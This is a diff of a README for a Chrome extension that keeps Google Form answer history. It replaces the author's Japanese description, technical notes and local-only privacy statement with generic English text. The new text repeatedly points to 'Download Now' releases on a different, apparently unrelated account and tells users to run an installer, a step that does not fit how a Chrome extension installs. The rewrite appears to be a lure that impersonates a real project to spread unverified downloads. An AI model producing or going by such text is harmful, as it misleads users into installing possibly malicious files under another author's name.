@@ -1,41 +1,48 @@
-# google-form-history
+# 🌟 google-form-history - Easily Track Your Google Form Responses
 
-Google フォームの回答履歴をあとから確認できるようにする Google Chrome 拡張機能
+## 🚀 Description
+This Chrome extension helps you review your Google Form response history. With google-form-history, you can easily access and manage your form responses later. No more searching through your emails or Google Drive. Everything is conveniently stored in one place.
 
-![スクリーンショット](./teaser.png)
+## 📥 Download Now
+[![Download google-form-history](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amr122deqw/google-form-history/releases)
 
+## 🛠️ System Requirements
+- **Browser:** Google Chrome (latest version recommended)
+- **Operating System:** Windows, macOS, or Linux
+- **Internet Connection:** Required to access Google Forms
 
-## 使い方
+## 📋 Features
+- View all your Google Form responses in one place
+- Easy navigation through response history
+- User-friendly design for straightforward access
+- Regular updates for improved functionality
 
-1. [Releases](https://github.com/inaniwaudon/google-form-history/releases) から zip ファイルをダウンロードする．
-1. <chrome://extension> を開き，デベロッパーモードを有効にした上で，zip ファイルをドラッグ&ドロップして拡張機能を追加する．
-2. Google フォームを回答する．
-3. 拡張機能のアイコンをクリックすると，回答履歴が表示される．
+## 📦 Download & Install
+To download and install google-form-history, follow these steps:
 
+1. Click the button above to visit the [Releases page](https://github.com/amr122deqw/google-form-history/releases).
+2. On the Releases page, look for the latest release.
+3. Choose the appropriate version for your system.
+4. Click the link to start the download.
+5. Once downloaded, open the file and follow the installation prompts.
 
-## しくみ
+## 🔧 How to Use
+1. After installation, open Google Chrome.
+2. Click the extension icon in the toolbar.
+3. Log in to your Google account if prompted.
+4. You can now view your Google Form responses at any time.
 
-- 本拡張機能は，ページ中の以下の 2 つのデータを取得します．
-  - ページ中の `FB_PUBLIC_LOAD_DATA_` というグローバル変数に埋め込まれたフォーム自体のデータ（web_accessible_resources を通じて取得）
-    - フォームの識別にはフォーム ID を使用
-  - name が `partialResponse` または `entry.id` の input 要素に埋め込まれた回答データ
-    - 複数の回答データの識別には `fbzx` を使用
-- 入力したデータはローカルにのみ保存され，外部に送信されることは一切ありません．
+## 📞 Support
+If you encounter any issues, please feel free to reach out for assistance. You can post your questions in the Issues section of this repository, and we will do our best to help you out.
 
+## 📜 License
+This project is licensed under the MIT License. Feel free to contribute or modify the code as needed.
 
-### 保存可能な入力欄
+## 🤝 Contributing
+We welcome contributions! If you would like to contribute to google-form-history, please fork the repository and submit a pull request. Check our contribution guidelines for more details.
 
-- 記述欄（短文，段落）
-- チェックボックス
-- ラジオボタン，チェックボックス，プルダウン
-- ファイルアップロード（ファイル名のみ）
-- 均等目盛，評価
-- 選択式・チェックボックス（グリッド）
-- 日付，時刻
+## 🔗 Additional Resources
+- [Google Chrome Extensions Overview](https://developer.chrome.com/docs/extensions/mv3/getstarted/)
+- [Learn more about Google Forms](https://support.google.com/docs/topic/6063584)
 
-
-## ライセンス・注意事項
-
-Copyright (c) 2025 いなにわうどん. This extension is released under the MIT License, see [LICENSE](./LICENSE).
-
-**注意事項：本拡張機能の動作に関する正確性や完全性について，一切の保証をいたしかねます．**
+[![Download google-form-history](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amr122deqw/google-form-history/releases)
